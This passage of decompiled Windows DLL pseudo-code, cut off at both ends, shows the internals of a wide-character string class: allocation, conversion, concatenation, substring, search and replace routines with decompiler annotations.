  *(_DWORD *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v3 = wcslen(v9);
  v4 = v3 + wcslen(Source);
  *(_DWORD *)(a1 + 28) = v4;
  *(_DWORD *)(a1 + 32) = v4;
  v5 = (wchar_t *)operator new(2 * (v4 + 1));
  v8 = String;
  v7 = *(_DWORD *)(a1 + 28) + 1;
  *(_DWORD *)(a1 + 12) = v5;
  if ( wcscpy_s(v5, v7, v8) || (result = wcscat_s(*(wchar_t **)(a1 + 12), *(_DWORD *)(a1 + 28) + 1, Source)) != 0 )
  {
    sub_10016441(&String);
    _CxxThrowException(&String, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000C8A2) --------------------------------------------------------
int __userpurge sub_1000C8A2@<eax>(int a1@<edi>, int a2)
{
  char *v2; // eax

  *(_DWORD *)a2 = &off_10093D08;
  *(_DWORD *)(a2 + 4) = 0;
  *(_BYTE *)(a2 + 8) = 1;
  *(_DWORD *)a2 = &off_10093640;
  v2 = (char *)operator new(2 * (a1 + 1));
  *(_DWORD *)(a2 + 12) = v2;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 0;
  *(_BYTE *)(a2 + 24) = 0;
  *(_DWORD *)(a2 + 28) = a1;
  *(_DWORD *)(a2 + 32) = a1;
  sub_1000C66C(v2);
  *(_WORD *)(*(_DWORD *)(a2 + 12) + 2 * *(_DWORD *)(a2 + 28)) = 0;
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093640: using guessed type int (__thiscall *off_10093640)(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (1000C914) --------------------------------------------------------
void *__thiscall sub_1000C914(void *Block, char a2)
{
  sub_1000CBC7((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000C934) --------------------------------------------------------
int __stdcall sub_1000C934(int a1, wchar_t *a2)
{
  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10093640;
  sub_1000C690(a1, a2);
  return a1;
}
// 10093640: using guessed type int (__thiscall *off_10093640)(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (1000C971) --------------------------------------------------------
int __stdcall sub_1000C971(int a1, int a2)
{
  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10093640;
  sub_1000C690(a1, *(wchar_t **)(a2 + 12));
  return a1;
}
// 10093640: using guessed type int (__thiscall *off_10093640)(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (1000C9B1) --------------------------------------------------------
int __stdcall sub_1000C9B1(int a1, wchar_t *a2, wchar_t *a3)
{
  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10093640;
  sub_1000C81A(a1, a2, a3);
  return a1;
}
// 10093640: using guessed type int (__thiscall *off_10093640)(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (1000C9F1) --------------------------------------------------------
int __stdcall sub_1000C9F1(int a1, char *String, size_t MaxCount)
{
  size_t v3; // eax
  WCHAR *v4; // eax
  int v5; // ecx
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  pExceptionObject[5] = 0;
  *(_DWORD *)a1 = &off_10093640;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  v3 = strnlen(String, MaxCount);
  *(_DWORD *)(a1 + 28) = v3;
  *(_DWORD *)(a1 + 32) = v3;
  v4 = (WCHAR *)operator new(2 * (v3 + 1));
  v5 = *(_DWORD *)(a1 + 28);
  *(_DWORD *)(a1 + 12) = v4;
  if ( v5 && !MultiByteToWideChar(0, 0, String, v5, v4, v5 + 1) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  *(_WORD *)(*(_DWORD *)(a1 + 12) + 2 * *(_DWORD *)(a1 + 28)) = 0;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093640: using guessed type int (__thiscall *off_10093640)(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (1000CA99) --------------------------------------------------------
void __thiscall sub_1000CA99(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 2;
  *(_DWORD *)((char *)v2 + v1 - 8) = &off_1009362C;
  sub_1001646C(v2);
}
// 1009362C: using guessed type int (__stdcall *off_1009362C)(char);

//----- (1000CAAE) --------------------------------------------------------
_DWORD *__thiscall sub_1000CAAE(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10093634;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 2, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_1009362C;
  this[1] = a2[1];
  return this;
}
// 1009362C: using guessed type int (__stdcall *off_1009362C)(char);

//----- (1000CB15) --------------------------------------------------------
char *__thiscall sub_1000CB15(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 2);
  sub_1000CA99(this - 2);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000CB37) --------------------------------------------------------
void __usercall sub_1000CB37(int a1@<esi>)
{
  int v1; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  if ( !*(_BYTE *)(a1 + 24) || !*(_BYTE *)(a1 + 8) )
  {
    if ( *(_DWORD *)(a1 + 16) && *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 20) )
    {
      j__free(*(void **)(a1 + 16));
      *(_DWORD *)(a1 + 16) = operator new(*(_DWORD *)(a1 + 28) + 1);
      *(_DWORD *)(a1 + 20) = *(_DWORD *)(a1 + 28);
    }
    if ( !*(_DWORD *)(a1 + 16) )
    {
      v1 = *(_DWORD *)(a1 + 28);
      *(_DWORD *)(a1 + 20) = v1;
      *(_DWORD *)(a1 + 16) = operator new(v1 + 1);
    }
    if ( !WideCharToMultiByte(
            0,
            0,
            *(LPCWCH *)(a1 + 12),
            *(_DWORD *)(a1 + 28) + 1,
            *(LPSTR *)(a1 + 16),
            *(_DWORD *)(a1 + 20) + 1,
            0,
            0) )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    *(_BYTE *)(a1 + 24) = 1;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1000CB37: using guessed type _DWORD pExceptionObject[3];

//----- (1000CBC7) --------------------------------------------------------
void __stdcall sub_1000CBC7(int a1)
{
  *(_DWORD *)a1 = &off_10093640;
  j__free(*(void **)(a1 + 12));
  if ( *(_DWORD *)(a1 + 16) )
    j__free(*(void **)(a1 + 16));
  *(_DWORD *)a1 = &off_10093D08;
}
// 10093640: using guessed type int (__thiscall *off_10093640)(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (1000CC20) --------------------------------------------------------
_DWORD *__stdcall sub_1000CC20(_DWORD *a1, wchar_t *a2)
{
  void *v2; // eax
  int v3; // eax

  *a1 = off_1009363C;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_1000C934((int)v2, a2);
  else
    v3 = 0;
  a1[1] = v3;
  sub_10003386(a1 + 1);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CC90) --------------------------------------------------------
_DWORD *__userpurge sub_1000CC90@<eax>(int a1@<edi>, _DWORD *a2)
{
  void *v2; // eax
  int v3; // eax

  *a2 = off_1009363C;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_1000C8A2(a1, (int)v2);
  else
    v3 = 0;
  a2[1] = v3;
  sub_10003386(a2 + 1);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CCE5) --------------------------------------------------------
_DWORD *__userpurge sub_1000CCE5@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // eax
  const wchar_t *v3; // eax
  int v4; // eax
  _DWORD *v5; // esi
  unsigned int v6; // eax
  void *v7; // eax
  int v8; // edx
  size_t v10; // [esp-4h] [ebp-24h]
  int pExceptionObject[3]; // [esp+10h] [ebp-10h] BYREF
  int v12; // [esp+1Ch] [ebp-4h]

  *a2 = off_1009363C;
  pExceptionObject[0] = (int)operator new(0x24u);
  v2 = 0;
  v12 = 0;
  if ( pExceptionObject[0] )
  {
    v10 = a1[3] >> 1;
    v3 = (const wchar_t *)sub_10016C24(a1);
    v4 = wcsnlen(v3, v10);
    v2 = sub_1000C8A2(v4, pExceptionObject[0]);
  }
  v5 = a2 + 1;
  a2[1] = v2;
  sub_10003386(a2 + 1);
  v12 = 1;
  v6 = a1[3];
  if ( (v6 & 1) != 0 && v6 >> 1 <= *(_DWORD *)(*v5 + 28) )
  {
    sub_10016441(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v7 = (void *)sub_10016C24(a1);
  sub_1000C650(*(_DWORD *)(v8 + 28), *(void **)(v8 + 12), *(_DWORD *)(v8 + 28), v7);
  *(_WORD *)(*(_DWORD *)(*v5 + 12) + 2 * *(_DWORD *)(*v5 + 28)) = 0;
  return a2;
}
// 1000CD75: variable 'v8' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CD9F) --------------------------------------------------------
_DWORD *__thiscall sub_1000CD9F(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  char *v4; // eax
  size_t v6; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]

  *a2 = off_1009363C;
  Block = operator new(0x24u);
  v3 = 0;
  if ( Block )
  {
    v6 = this[3];
    v4 = (char *)sub_10016C24(this);
    v3 = sub_1000C9F1((int)Block, v4, v6);
  }
  a2[1] = v3;
  sub_10003386(a2 + 1);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CDFA) --------------------------------------------------------
_DWORD *__cdecl sub_1000CDFA(_DWORD *a1)
{
  _DWORD *v1; // ecx

  sub_1000CD9F(v1, a1);
  return a1;
}
// 1000CE0D: variable 'v1' is possibly undefined

//----- (1000CE26) --------------------------------------------------------
_DWORD *__stdcall sub_1000CE26(_DWORD *a1, int a2)
{
  *a1 = off_1009363C;
  a1[1] = *(_DWORD *)(a2 + 4);
  sub_10003386(a1 + 1);
  return a1;
}
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CE59) --------------------------------------------------------
LONG __thiscall sub_1000CE59(int *this)
{
  *this = (int)off_1009363C;
  return sub_1000E23A(this + 1);
}
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CE81) --------------------------------------------------------
_DWORD *__stdcall sub_1000CE81(_DWORD *a1, char *a2)
{
  void *v2; // eax
  int v3; // eax

  *a1 = off_1009363C;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_1000C9F1((int)v2, a2, 0x7FFFFFFFu);
  else
    v3 = 0;
  a1[1] = v3;
  sub_10003386(a1 + 1);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009363C: using guessed type int (__thiscall *off_1009363C[2])(void *Block, char);

//----- (1000CED7) --------------------------------------------------------
int __usercall sub_1000CED7@<eax>(int a1@<edi>)
{
  sub_1000CB37(*(_DWORD *)(a1 + 4));
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
}

//----- (1000CEE8) --------------------------------------------------------
_DWORD *__cdecl sub_1000CEE8(_DWORD *a1, char *a2)
{
  sub_1000CE81(a1, a2);
  return a1;
}

//----- (1000CF22) --------------------------------------------------------
char __thiscall sub_1000CF22(int *this)
{
  int *v1; // edi
  int v2; // eax
  char v3; // bl
  void *v4; // eax
  void *Block[3]; // [esp+10h] [ebp-10h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v1 = this + 1;
  v2 = this[1];
  v3 = *(_BYTE *)(v2 + 8);
  if ( *(_DWORD *)(v2 + 4) > 1u )
  {
    Block[0] = operator new(0x24u);
    v4 = 0;
    v7 = 0;
    if ( Block[0] )
      v4 = (void *)sub_1000C934((int)Block[0], *(wchar_t **)(*v1 + 12));
    v7 = -1;
    Block[0] = v4;
    sub_10003386((int *)Block);
    v7 = 1;
    sub_10002C25((int *)Block, v1);
    v7 = -1;
    sub_1000E23A((int *)Block);
  }
  *(_BYTE *)(*v1 + 8) = 0;
  *(_BYTE *)(*v1 + 24) = 0;
  return v3;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000CF9F) --------------------------------------------------------
int __userpurge sub_1000CF9F@<eax>(int *a1@<esi>, int a2)
{
  sub_1000CF22(a1);
  return *(_DWORD *)(a1[1] + 12) + 2 * a2;
}

//----- (1000CFB9) --------------------------------------------------------
int __userpurge sub_1000CFB9@<eax>(int a1@<ebx>, int a2)
{
  int v2; // eax
  void *Block; // [esp+10h] [ebp-10h]

  Block = operator new(0x24u);
  v2 = 0;
  if ( Block )
    v2 = sub_1000C9B1((int)Block, *(wchar_t **)(*(_DWORD *)(a1 + 4) + 12), *(wchar_t **)(*(_DWORD *)(a2 + 4) + 12));
  a2 = v2;
  sub_10003386(&a2);
  sub_10002C25(&a2, (int *)(a1 + 4));
  sub_1000E23A(&a2);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000D027) --------------------------------------------------------
_DWORD *__cdecl sub_1000D027(_DWORD *a1, int a2, int a3)
{
  sub_1000CE26(a1, a2);
  sub_1000CFB9((int)a1, a3);
  return a1;
}

//----- (1000D097) --------------------------------------------------------
bool __usercall sub_1000D097@<al>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1000D0B5(a1, a2) < 0;
}

//----- (1000D0B5) --------------------------------------------------------
int __usercall sub_1000D0B5@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v2; // eax
  const wchar_t *v3; // edx

  v2 = *(_DWORD *)(a1 + 4);
  v3 = *(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12);
  if ( v3 == *(const wchar_t **)(v2 + 12) )
    return 0;
  else
    return wcscmp(v3, *(const wchar_t **)(v2 + 12));
}

//----- (1000D0D9) --------------------------------------------------------
int __usercall sub_1000D0D9@<eax>(int *a1@<esi>)
{
  sub_1000CF22(a1);
  return *(_DWORD *)(a1[1] + 12);
}

//----- (1000D0EE) --------------------------------------------------------
size_t __usercall sub_1000D0EE@<eax>(int a1@<eax>)
{
  int v1; // ecx

  v1 = *(_DWORD *)(a1 + 4);
  if ( *(_BYTE *)(v1 + 8) )
    return *(_DWORD *)(v1 + 32);
  else
    return sub_1000D100(a1);
}

//----- (1000D100) --------------------------------------------------------
size_t __usercall sub_1000D100@<eax>(int a1@<eax>)
{
  return wcsnlen(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) + 1);
}

//----- (1000D118) --------------------------------------------------------
int __usercall sub_1000D118@<eax>(int a1@<esi>)
{
  int v1; // edi
  int result; // eax

  v1 = *(_DWORD *)(a1 + 4);
  *(_DWORD *)(v1 + 32) = sub_1000D100(a1);
  result = *(_DWORD *)(a1 + 4);
  *(_BYTE *)(result + 8) = 1;
  return result;
}

//----- (1000D184) --------------------------------------------------------
void __usercall sub_1000D184(int a1@<esi>, wchar_t *Format, ...)
{
  _DWORD *v2; // eax
  int v3; // [esp+10h] [ebp-7E8h] BYREF
  int pExceptionObject; // [esp+14h] [ebp-7E4h] BYREF
  wchar_t Buffer[1006]; // [esp+18h] [ebp-7E0h] BYREF
  int v6; // [esp+7F4h] [ebp-4h]
  va_list va; // [esp+804h] [ebp+Ch] BYREF

  va_start(va, Format);
  if ( _vsnwprintf_s(Buffer, 0x3E8u, 0xFFFFFFFF, Format, va) == -1 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v2 = sub_1000CC20(&v3, Buffer);
  v6 = 0;
  sub_10002C25(v2 + 1, (int *)(a1 + 4));
  v6 = -1;
  sub_1000CE59(&v3);
  sub_1006A5A7();
}

//----- (1000D20A) --------------------------------------------------------
_DWORD *__cdecl sub_1000D20A(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = sub_1000CC20(v5, word_100B832C);
  v7 = 1;
  sub_1000D184((int)v2, a08x, a2);
  sub_1000CE26(a1, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000CE59(v5);
  return a1;
}
// 1000D243: variable 'v3' is possibly undefined
// 100B832C: using guessed type wchar_t word_100B832C[2];
// 100B8330: using guessed type wchar_t a08x[5];

//----- (1000D260) --------------------------------------------------------
_DWORD *__cdecl sub_1000D260(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = sub_1000CC20(v5, word_100B833C);
  v7 = 1;
  sub_1000D184((int)v2, aD_0, a2);
  sub_1000CE26(a1, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000CE59(v5);
  return a1;
}
// 1000D299: variable 'v3' is possibly undefined
// 100B833C: using guessed type wchar_t word_100B833C[2];
// 100B8340: using guessed type wchar_t aD_0[3];

//----- (1000D2DE) --------------------------------------------------------
_DWORD *__userpurge sub_1000D2DE@<eax>(int a1@<ecx>, unsigned int a2@<ebx>, _DWORD *a3, rsize_t MaxCount)
{
  int v5; // eax
  int v6; // edi
  rsize_t v7; // esi
  int v9; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+14h] [ebp-14h]
  int v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  v11 = 0;
  v5 = *(_DWORD *)(a1 + 4);
  if ( a2 < *(_DWORD *)(v5 + 28) && MaxCount )
  {
    if ( MaxCount == -2 || a2 + MaxCount > *(_DWORD *)(v5 + 28) )
      MaxCount = *(_DWORD *)(v5 + 28) - a2;
    sub_1000CC90(MaxCount, &v9);
    v12 = 1;
    v6 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
    v7 = *(_DWORD *)(v10 + 28) + 1;
    sub_1000CF22(&v9);
    if ( wcsncpy_s(*(wchar_t **)(v10 + 12), v7, (const wchar_t *)(v6 + 2 * a2), MaxCount) )
    {
      sub_10016441(&MaxCount);
      _CxxThrowException(&MaxCount, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    sub_1000CE26(a3, (int)&v9);
    v11 = 1;
    LOBYTE(v12) = 0;
    sub_1000CE59(&v9);
  }
  else
  {
    sub_1000CC20(a3, word_100B8348);
    v12 = 0;
    v11 = 1;
  }
  return a3;
}
// 100B8348: using guessed type wchar_t word_100B8348[2];

//----- (1000D3BA) --------------------------------------------------------
int *__usercall sub_1000D3BA@<eax>(int *a1@<eax>)
{
  size_t v2; // edi
  char v3; // bl
  wchar_t *v4; // eax
  size_t v6; // [esp-Ch] [ebp-18h]

  v2 = *(_DWORD *)(a1[1] + 28);
  v3 = sub_1000CF22(a1);
  v6 = *(_DWORD *)(a1[1] + 28) + 1;
  v4 = (wchar_t *)sub_1000D0D9(a1);
  _wcsnset_s(v4, v6, 0, v2);
  if ( v3 )
    sub_1000D118((int)a1);
  return a1;
}

//----- (1000D426) --------------------------------------------------------
int *__usercall sub_1000D426@<eax>(int *a1@<eax>)
{
  char v2; // bl
  wchar_t *v3; // eax
  size_t v5; // [esp-4h] [ebp-Ch]

  v2 = sub_1000CF22(a1);
  v5 = *(_DWORD *)(a1[1] + 28) + 1;
  v3 = (wchar_t *)sub_1000D0D9(a1);
  _wcslwr_s(v3, v5);
  if ( v2 )
    sub_1000D118((int)a1);
  return a1;
}

//----- (1000D47D) --------------------------------------------------------
int *__userpurge sub_1000D47D@<eax>(int *a1@<eax>, __int16 a2)
{
  unsigned int v3; // ebx
  unsigned int i; // edi
  char v6; // [esp+Fh] [ebp-1h]

  v6 = sub_1000CF22(a1);
  v3 = *(_DWORD *)(a1[1] + 28);
  for ( i = 0; i < v3; ++i )
  {
    if ( *(_WORD *)(sub_1000D0D9(a1) + 2 * i) == a2 )
      *(_WORD *)(sub_1000D0D9(a1) + 2 * i) = 95;
  }
  if ( v6 )
    sub_1000D118((int)a1);
  return a1;
}

//----- (1000D4FF) --------------------------------------------------------
int __stdcall sub_1000D4FF(int a1, int pExceptionObject, int a3, unsigned int a4)
{
  int v4; // edi
  int v5; // eax
  int *v6; // ebx
  int v8; // eax
  int v9; // edi
  int v10; // eax
  int v11; // esi
  int v12; // edi
  int v13; // eax
  unsigned int v14; // ecx
  int v15; // esi
  int v16; // ecx
  int v17; // ecx
  int v18; // esi
  int v19; // [esp+10h] [ebp-3Ch] BYREF
  int v20; // [esp+14h] [ebp-38h]
  int v21[2]; // [esp+20h] [ebp-2Ch] BYREF
  int v22; // [esp+28h] [ebp-24h] BYREF
  int v23; // [esp+2Ch] [ebp-20h] BYREF
  int v24; // [esp+30h] [ebp-1Ch]
  void *Source; // [esp+34h] [ebp-18h]
  int v26; // [esp+38h] [ebp-14h] BYREF
  unsigned int v27; // [esp+3Ch] [ebp-10h]
  int v28; // [esp+48h] [ebp-4h]

  v4 = pExceptionObject;
  v5 = *(_DWORD *)(pExceptionObject + 4);
  if ( !*(_DWORD *)(v5 + 28) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = (int *)(a1 + 4);
  if ( *(_DWORD *)(v5 + 28) > *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
    return a1;
  sub_1000E274(&v19);
  v8 = 0;
  v28 = 0;
  v27 = 0;
  while ( 1 )
  {
    v26 = sub_1000D8AA(v4, a1, v8);
    if ( v26 == -1 || a4 && a4 <= v27 )
      break;
    ++v27;
    sub_1000E398(&v19, (int)&v26);
    v8 = v26 + 1;
  }
  if ( !v20 )
  {
    v28 = -1;
    sub_1000E2E8((int)&v19);
    return a1;
  }
  sub_1000CC90(
    *(_DWORD *)(*v6 + 28) + v20 * (*(_DWORD *)(*(_DWORD *)(a3 + 4) + 28) - *(_DWORD *)(*(_DWORD *)(v4 + 4) + 28)),
    &v22);
  LOBYTE(v28) = 1;
  sub_1000D3BA(&v22);
  sub_1000DBA3(&v19, (int)v21);
  LOBYTE(v28) = 2;
  a4 = -1;
  v9 = 0;
  v27 = 0;
  do
  {
    v10 = *(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v21[0] + 12))(v21[0]);
    v24 = v10;
    if ( a4 != -1 )
      v10 = v10 - *(_DWORD *)(*(_DWORD *)(pExceptionObject + 4) + 28) - a4;
    a4 = v10;
    Source = *(void **)(*v6 + 12);
    v11 = *(_DWORD *)(v23 + 28) + 1;
    sub_1000CF22(&v22);
    memcpy_s((void *const)(*(_DWORD *)(v23 + 12) + 2 * v9), 2 * (v11 - v9), (char *)Source + 2 * v27, 2 * a4);
    v27 += a4;
    v12 = a4 + v9;
    v13 = *(_DWORD *)(a3 + 4);
    v14 = *(_DWORD *)(v13 + 28);
    Source = *(void **)(v13 + 12);
    v15 = *(_DWORD *)(v23 + 28);
    a4 = v14;
    sub_1000CF22(&v22);
    memcpy_s((void *const)(*(_DWORD *)(v23 + 12) + 2 * v12), 2 * (v15 + 1 - v12), Source, 2 * a4);
    v27 += *(_DWORD *)(*(_DWORD *)(pExceptionObject + 4) + 28);
    v9 = a4 + v12;
    a4 = v24;
    sub_1000DE18(v16, v21[0]);
  }
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v21[0] + 4))(v21[0]) );
  v17 = *(_DWORD *)(*v6 + 28);
  a3 = *(_DWORD *)(*v6 + 12);
  v18 = *(_DWORD *)(v23 + 28);
  pExceptionObject = v17;
  sub_1000CF22(&v22);
  memcpy_s(
    (void *const)(*(_DWORD *)(v23 + 12) + 2 * v9),
    2 * (v18 + 1 - v9),
    (const void *const)(a3 + 2 * v27),
    2 * (pExceptionObject - v27));
  sub_1000D118((int)&v22);
  sub_10002C25(&v23, v6);
  LOBYTE(v28) = 1;
  sub_1000E6EB(v21);
  LOBYTE(v28) = 0;
  sub_1000CE59(&v22);
  v28 = -1;
  sub_1000E2E8((int)&v19);
  return a1;
}
// 1000D6A9: variable 'v16' is possibly undefined

//----- (1000D744) --------------------------------------------------------
int *__userpurge sub_1000D744@<eax>(int *a1@<eax>, int a2@<ebx>, int pExceptionObject, unsigned int a4)
{
  unsigned int v5; // ecx
  int v6; // eax
  int i; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edi
  rsize_t v12; // [esp-10h] [ebp-1Ch]
  const void *v13; // [esp-Ch] [ebp-18h]
  rsize_t v14; // [esp-8h] [ebp-14h]
  unsigned int v15; // [esp+4h] [ebp-8h]
  char v16; // [esp+Bh] [ebp-1h]

  v5 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28);
  if ( !v5 || *(_DWORD *)(*(_DWORD *)(pExceptionObject + 4) + 28) != v5 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = a1[1];
  if ( v5 <= *(_DWORD *)(v6 + 28) )
  {
    v15 = 0;
    v16 = *(_BYTE *)(v6 + 8);
    for ( i = sub_1000D8AA(a2, (int)a1, 0); ; i = sub_1000D8AA(a2, (int)a1, v10 + 1) )
    {
      v10 = i;
      if ( i == -1 || a4 && a4 <= v15 )
        break;
      v8 = *(_DWORD *)(pExceptionObject + 4);
      ++v15;
      v14 = 2 * *(_DWORD *)(v8 + 28);
      v13 = *(const void **)(v8 + 12);
      v12 = 2 * (*(_DWORD *)(a1[1] + 28) + 1 - v10);
      v9 = sub_1000D0D9(a1);
      memcpy_s((void *const)(v9 + 2 * v10), v12, v13, v14);
    }
    if ( v16 )
      sub_1000D118((int)a1);
  }
  return a1;
}

//----- (1000D7ED) --------------------------------------------------------
int *__usercall sub_1000D7ED@<eax>(unsigned int a1@<eax>, int *a2@<ecx>)
{
  char v4; // bl
  int v5; // edi

  if ( a1 < *(_DWORD *)(a2[1] + 28) )
  {
    v4 = sub_1000CF22(a2);
    *(_WORD *)(sub_1000D0D9(a2) + 2 * a1) = 0;
    v5 = a2[1];
    *(_DWORD *)(v5 + 32) = sub_1000D100((int)a2);
    if ( v4 )
      sub_1000D118((int)a2);
  }
  return a2;
}

//----- (1000D84E) --------------------------------------------------------
BOOL __usercall sub_1000D84E@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return _wcsicmp(*(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12), *(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12)) == 0;
}

//----- (1000D869) --------------------------------------------------------
int __userpurge sub_1000D869@<eax>(int a1@<ecx>, int a2@<esi>, wchar_t a3)
{
  wchar_t *v3; // eax

  v3 = wcschr((const wchar_t *)(*(_DWORD *)(*(_DWORD *)(a2 + 4) + 12) + 2 * a1), a3);
  return sub_1000D927((int)v3, a2);
}

//----- (1000D88B) --------------------------------------------------------
int __userpurge sub_1000D88B@<eax>(int a1@<esi>, wchar_t a2)
{
  wchar_t *v2; // eax

  v2 = wcsrchr(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), a2);
  return sub_1000D927((int)v2, a1);
}

//----- (1000D8AA) --------------------------------------------------------
int __userpurge sub_1000D8AA@<eax>(int a1@<eax>, int a2@<esi>, int a3)
{
  wchar_t *v3; // eax

  v3 = wcsstr(
         (const wchar_t *)(*(_DWORD *)(*(_DWORD *)(a2 + 4) + 12) + 2 * a3),
         *(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12));
  return sub_1000D927((int)v3, a2);
}

//----- (1000D927) --------------------------------------------------------
int __usercall sub_1000D927@<eax>(int a1@<eax>, int a2@<ecx>)
{
  if ( a1 )
    return (a1 - *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12)) >> 1;
  else
    return -1;
}

//----- (1000D938) --------------------------------------------------------
_DWORD *__thiscall sub_1000D938(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
